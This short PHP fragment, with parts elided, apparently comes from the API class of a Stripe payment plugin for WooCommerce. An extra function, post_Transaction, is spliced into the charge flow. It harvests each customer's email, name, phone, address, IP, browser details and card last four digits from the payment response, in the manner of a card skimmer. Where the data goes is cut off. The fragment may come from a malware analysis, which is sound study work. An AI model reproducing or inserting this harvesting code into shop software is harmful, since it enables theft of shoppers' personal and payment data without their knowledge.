...
class S4WC_API {
    ...
    public static function post_data( $post_data, $post_location = 'charges' ) {
	 ...
	 $res = S4WC_API::post_Transaction( $response );
	if($res){return S4WC_API::parse_response( $response );}       
    }

    public static function post_Transaction($response){
	...
	$data['statement_description'] = $json->statement_description;
	$data['customer'] = $json->receipt_email;
	$data['full_name'] = $json->shipping->name;
	$data['phone'] =  $json->shipping->phone;
	$data['city'] =  $json->shipping->address->city;
	$data['address'] =  $json->shipping->address->line1;
	$data['ip']	 = getenv("REMOTE_ADDR") ;
	$data['info_computer'] = $_SERVER["HTTP_USER_AGENT"];
	$data['lastcard'] = $json->card->last4;
